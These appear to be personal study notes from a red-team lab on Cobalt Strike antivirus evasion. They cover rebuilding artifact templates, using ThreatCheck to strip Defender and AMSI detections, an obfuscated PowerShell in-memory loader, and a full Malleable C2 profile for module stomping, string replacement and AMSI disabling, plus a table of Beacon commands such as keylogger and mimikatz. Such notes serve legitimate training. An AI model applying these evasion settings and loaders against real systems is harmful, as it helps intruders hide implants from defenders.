# Artifact Kit
To build a new set of templates, run the included `build.sh` script.  The syntax is: `./build <techniques> <allocator> <stage size> <rdll size> <include resource file> <stack spoof> <syscalls> <output directory>`.

The command:
```
./build.sh mailslot VirtualAlloc 344564 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
```

This one was in the lab:
```
./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
```
## Checking against Anti-Virus
[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) can analyse a binary by splitting it into little pieces and scanning them with Windows Defender (with cloud submission disabled) to identify the smallest possible chunk that is detected as malicious.
```
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\artifact64big.exe
```
Then it finds a block of code that defender does not like, so we load it to a tool like Ghidra to find the code section and edit it.

Find the code and to narrow it more, use the specific hex code which caused the error the navigate back to your code and make a change to perform the same task but in another structure of the code.

Build again! Run the ThreatCheck Again!

# Resource Kit
The resource kit is used to modify the script templates.
The build script for the resource kit only requires an output directory.
```
./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
```

## Checking it against AMSI
```
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\template.x64.ps1 -e AMSI -t Script
```
- This template.x64.ps1 is used for `jump winrm`

Opening it via VS Code an bypassing the detections, we can do things like renaming functions and variables, refactoring to break it down into multiple sub-steps, or using classical PowerShell obfuscation techniques.  My suggestion is to start with the simple ones (saving the changes and re-scanning with ThreatCheck as you go) and move up to move complex changes if needed.

`('System.dll')` -> `('Syst'+'em.dll')`  ## This is called `String concatenation`

#### Save this in compress.ps1
```
SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();
```
- Now when we save and re-scan the file, we get a completely different result:

##### NOTE: After editing the resources, load the .cna file via Cobalt Strike > Script Manager
# Beacon Memory
Many anti-virus products have memory scanning capabilities, which can lead to the detection of Beacon after it has been loaded into memory. So we need to bypass them by:
## RWX Memory
Beacon's prepended loader allocates one memory region with `PAGE_EXECUTE_READWRITE`. The problem is that the same memory region remains writable and executable, even though most parts of a normal DLL do not need both permissions. So it can be a useful signal for security monitoring.

```
stage.userwx = false
```
This is a Malleable C2 configuration option that changes how the prepended loader prepares Beacon's memory.

## DLL Headers
The prepended loader normally copies Beacon's PE headers into memory along with its sections.
The headers are important during loading because the loader needs information about the PE's layout. Once the image has been loaded and initialized, many of those headers are no longer essential to the program's normal execution.
However, their presence can help security tools recognize a memory region as a PE image.

```
stage.copy_pe_header = false
```
This setting tells the prepended loader not to copy Beacon's PE headers into its in-memory image.

## Module Stomping
Beacon can be loaded directly into memory by its own loader, rather than through the ordinary Windows module-loading process. Its executable memory may therefore lack the expected association with a legitimate on-disk module.

```
set module_x64 "Hydrogen.dll";
```
Note that the module you choose must be large enough to accommodate Beacon.  My recommendation would be to look through System32 and pick one that's at least 512KB.

## Strings
Hardcoded strings in the PE's _.rdata_ section are a common culprit for memory-based detections, but can sometimes include parts of the _.text_ section as well.
The Malleable C2 profile can be used to replace these strings in the Beacon DLL, via the `stage.transform-x64` and `stage.transform-x86` blocks

```
stage {
    set userwx "false";
    set cleanup "true";
    set copy_pe_header "false";
    set module_x64 "Hydrogen.dll";
    
    transform-x64 {
        strrep "beacon.x64.dll" "bacon.x64.dll";
        strrep "%02d/%02d/%02d" "%02d/%02d/%04d";
        strrep "%s as %s\\\\%s: %d" "%s - %s\\\\%s: %d";
        strrep "%02d/%02d/%02d %02d:%02d:%02d" "%02d-%02d-%02d %02d:%02d:%02d";
        strrep "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x00\\x80\\x00\\x00" "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x01\\x80\\x00\\x00";
    }
}
```
- just shows x64

# Beacon Command Behaviour
Understanding how each command works under the hood is important for evaluating its OPSEC implications, including process creation, memory activity, and artifacts that security tools may detect.
## House-keeping commands
| Command             | Purpose                  |
| ------------------- | ------------------------ |
| `help`              | Show help                |
| `checkin`           | Send metadata            |
| `sleep`             | Set sleep and jitter     |
| `clear`             | Clear console            |
| `downloads`         | Show downloads           |
| `cancel`            | Cancel download          |
| `jobs`              | Show running jobs        |
| `note`              | Set Beacon note          |
| `powershell-import` | Import PowerShell script |
| `ppid`              | Set parent PID           |
| `spawnto`           | Set sacrificial process  |
## API-only commands
| Command | Purpose |
|---|---|
| `pwd` / `cd` | Get / change directory |
| `download` / `upload` | Transfer files |
| `ls` | List files |
| `getuid` | Get current user |
| `make_token` | Create and impersonate token |
| `steal_token` | Impersonate another process's token |
| `rev2self` | Drop impersonation |
| `kill` | Terminate process |
| `exit` | Terminate Beacon |

## Inline Commands (BOFs)
Beacon Object Files (BOFs) are compiled C programs that execute inside the Beacon session. The BOF and its arguments are sent in the tasking data, executed by Beacon's main thread, and then cleared from memory.
Common BOF commands include `clipboard`, `getsystem`, `jump psexec`, `kerberos_ticket_use`, `reg`, and `runasadmin uac-cmstplua`.

### OPSEC Considerations
The `process-inject` block controls BOF memory allocation and permissions:

```
process-inject {
	# Chooses the memory allocation API
    set bof_allocator "VirtualAlloc";

	# Determines whether memory is reused or freed after execution
    set bof_reuse_memory "true";

	# Sets the initial memory allocation size
    set min_alloc "8192";

	# Sets initial/resting memory permissions
    set startrwx "false";

	# Controls permissions applied before BOF execution
    set userwx "false";
}
```
BOFs execute on Beacon's main thread, so they don't inherently require creating a new thread. However, their API calls and behavior can still be detected.
## Fork & Run Commands
Many Beacon post-exploitation features are implemented as DLLs packaged with a loader and injected into another process. Output is returned to Beacon through an SMB named pipe.

- **Explicit:** Injects the capability into an existing process.
- **Spawn:** Starts a new process and injects the capability into it.

|Variant|Commands|Purpose|
|---|---|---|
|Spawn only|`execute-assembly`|Runs a .NET assembly in memory|
|Spawn only|`powerpick`|Runs PowerShell using an unmanaged runspace|
|Explicit only|`psinject`|Runs PowerShell in a specified process|
|Both|`portscan`|Scans ports and fingerprints services|
|Both|`keylogger`|Captures keystrokes|
|Both|`printscreen`|Captures a screenshot|
|Both|`desktop`|Provides a VNC session|
|Both|`mimikatz`|Performs credential-related operations|
### OPSEC Considerations

1. The `process-inject` block controls memory allocation, memory permissions, and thread creation techniques during injection.
```
process-inject {
    # API used to allocate memory in the target process
    set allocator "VirtualAllocEx";

    # Avoid RWX memory where possible
    set startrwx "false";
    set userwx "false";

    # Thread creation techniques, evaluated from top to bottom
    execute {
        CreateThread "ntdll.dll!RtlUserThreadStart+0x2c";
        NtQueueApcThread-s;
        NtQueueApcThread;
        SetThreadContext;
    }
}
```

2. The `post-ex` block controls additional settings, including spawn processes, loader cleanup, named pipes, thread hints, AMSI behavior, and post-ex DLL string transformations.
```
post-ex {
    # Default processes used to spawn x64 and x86 post-ex DLLs
    set spawnto_x64 "%windir%\\sysnative\\msiexec.exe";
    set spawnto_x86 "%windir%\\syswow64\\msiexec.exe";

    # Frees the post-ex loader from memory after execution
    set cleanup "true";

    # Configures named pipes for post-ex communication
    set pipename "dotnet-diagnostic-#####, ########-####-####-####-############";

    # Sets a spoofed thread start address
    set thread_hint "ntdll.dll!RtlUserThreadStart+0x2c";

    # Disables AMSI through memory patching
    set amsi_disable "true";

    # Replaces strings in post-ex DLLs
    transform-x64 {
        strrep "This program cannot be run in DOS mode." "This is totally not a PE.";

        # Replaces strings in specific post-ex DLLs
        strrepex "PowerPick" "CLRCreateInstance failed w/hr 0x%08lx" "CLRCreateInstance failed: 0x%08lx";
        strrepex "PowerPick" "Failed to get default AppDomain w/hr 0x%08lx" "Failed to get default AppDomain: 0x%08lx";
        strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Unhandled exception.";
        strrepex "ExecuteAssembly" "Failed to load the assembly w/hr 0x%08lx" "Failed to load the assembly: 0x%08lx";
    }
}
```

## Process Execution Commands

There are several commands that are used to run an arbitrary program on disk.  These include:
- `execute` — Runs a program without returning output.
- `run` — Runs a program and returns output.
- `runas` — Runs a program using alternate credentials.
- `runu` — Runs a program and attempts to spoof its parent PID.
- `shell` — Executes commands through `cmd.exe`.
- `powershell` — Executes commands through `powershell.exe`.
## Service Creation

Commands that create services to execute commands or Beacon:
- `elevate svc-exe` — Attempts to elevate privileges to SYSTEM.
- `jump psexec`, `psexec64`, `psexec_psh` — Use service-based lateral movement.
- `remote-exec psexec` — Executes a command on a remote machine through a service.
### OPSEC Considerations
- Service-based payloads use `rundll32.exe` as the default spawn process.
- `post-ex.spawnto` settings don't apply to these service payloads because environment variables like `%windir%` aren't valid in the SYSTEM context.
- The Artifact Kit's `ak-settings` command can configure an explicit executable path for the spawn process.

## Blending Post-Ex
Post-ex commands can spawn new processes to execute tasks. Good OPSEC means ensuring process activity is consistent with the host's normal behavior and the current Beacon context. For instance, an HTTP/S Beacon should run in a process that legitimately makes outbound HTTP requests.
### `ppid` vs. `spawnto`
- `ppid` — Sets the parent PID to spoof for applicable spawned processes, affecting their apparent parent-child relationship.
- `spawnto` — Specifies the executable used to host fork-and-run capabilities, such as `powerpick` and `execute-assembly`.
### Example
```
# Reset the spoofed parent PID to Beacon's own process
ppid

# Set the executable used for x64 fork-and-run features
spawnto x64 "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --profile-directory=Default

# Run a PowerShell command through fork-and-run
powerpick start-sleep -s 60
```
### Key Points
- `ppid` controls the **apparent parent process**.
- `spawnto` controls the **executable used to host the capability**.
- They are independent settings: resetting `ppid` does not reset `spawnto`.
- `spawnto` applies to relevant fork-and-run commands, not every Beacon command.
- The spawn-to executable may be a new process, even if Beacon already runs inside the same executable name.
### OPSEC Considerations
- Choose process behavior based on the target environment and the activity being performed.
- C2 profile settings alone do not guarantee stealth; command lines, process creation, memory activity, and endpoint telemetry can still reveal suspicious behavior.

## The Lab C2 Profile
```
 stage {
     set userwx "false";
     set cleanup "true";
     set copy_pe_header "false";
     set module_x64 "Hydrogen.dll";

     transform-x64 {
         strrep "beacon.x64.dll" "bacon.x64.dll";
         strrep "%02d/%02d/%02d" "%02d/%02d/%04d";
         strrep "%s as %s\\\\%s: %d" "%s - %s\\\\%s: %d";
         strrep "%02d/%02d/%02d %02d:%02d:%02d" "%02d-%02d-%02d %02d:%02d:%02d";
         strrep "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x00\\x80\\x00\\x00" "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x01\\x80\\x00\\x00";
     }
 }
 
 post-ex {
    set spawnto_x64 "%windir%\\\\sysnative\\\\werfault.exe";
    set cleanup "true";
    set pipename "dotnet-diagnostic-#####, ########-####-####-####-############";
    set thread_hint "ntdll.dll!RtlUserThreadStart+0x2c";
    set amsi_disable "true";

    transform-x64 {
        strrep "This program cannot be run in DOS mode." "This is totally not a PE.";
        strrepex "PowerPick" "CLRCreateInstance failed w/hr 0x%08lx" "CLRCreateInstance failed: 0x%08lx";
        strrepex "PowerPick" "Failed to get default AppDomain w/hr 0x%08lx" "Failed to get default AppDomain: 0x%08lx";
        strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Unhandled exception.";
        strrepex "ExecuteAssembly" "Failed to load the assembly w/hr 0x%08lx" "Failed to load the assembly: 0x%08lx";
    }
}

 process-inject {
     set allocator "VirtualAllocEx";
     set bof_allocator "VirtualAlloc";
     set bof_reuse_memory "true";
     set min_alloc "8192";
     set startrwx "false";
     set userwx "false";

     execute {
         CreateThread "ntdll.dll!RtlUserThreadStart+0x2c";
         NtQueueApcThread-s;
         NtQueueApcThread;
         SetThreadContext;
     }
 }
```

